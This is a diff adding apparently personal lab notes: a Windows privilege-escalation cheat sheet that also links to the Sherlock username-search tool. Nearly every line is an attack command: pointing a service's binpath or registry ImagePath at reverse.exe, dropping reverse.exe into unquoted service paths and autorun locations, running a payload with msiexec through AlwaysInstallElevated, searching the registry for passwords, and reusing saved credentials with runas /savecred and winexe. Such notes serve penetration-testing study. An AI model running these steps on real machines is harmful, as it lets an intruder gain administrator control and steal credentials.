@@ -1,0 +1,48 @@
+##SHERLOCK => https://github.com/sherlock-project/sherlock
+
+##Service Exploits - Insecure Service Permissions
+1) Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service: C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc    
+2) Query the service for getting service privileges: sc qc daclsvc    
+3) Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe: sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""    
+4) Setup local listener and run service: net start daclsvc    
+
+##Service Exploits - Unquoted Service Path
+1) Define services and run sc qc [service name], fuul ninary path C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe    
+2) Using accesschk.exe for access rights: C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"    
+3) Copy the reverse.exe executable to this directory and rename it Common.exe: copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"    
+4) Start listener and run service: net start unquotedsvc    
+
+##Service Exploits - Weak Registry Permissions
+1) Query register service: sc qc regsvc    
+2) Using accesschk.exe: C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc    
+3) Overwrite registry key: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f    
+4) Start listener and run service: net start regsvc    
+
+##Service Exploits - Insecure Service Executables
+1) Query service: sc qc filepermsvc    
+2) Use accesschk.exe: C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+3) Replace valid executable with our reverse.exe: copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+4) Start listener and run service: net start filepermsvc
+
+##Registry - AutoRuns
+1) Query the registry for AutoRun executables: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+2) Using accesschk.exe: C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+3) Replace valid executable with our reverse.exe: copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+
+##Registry - AlwaysInstallElevated
+1) Query registry: Note that both keys are set to 1 (0x1).
+        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+2) Generate payload .msi extension
+3) Transfer payload to vulnerable host
+4) Setup listener and run: msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+##Passwords - Registry
+The registry can be searched for keys and values that contain the word "password": reg query HKLM /f password /t REG_SZ /s
+Find admin AutoLogon credentials: reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+winexe -U 'admin%password' //[target host] cmd.exe
+
+##Passwords - Saved Creds
+1) List any saved credentials: cmdkey /list
+2) Start listener anr run our reverse.exe with user's saved credentials: runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
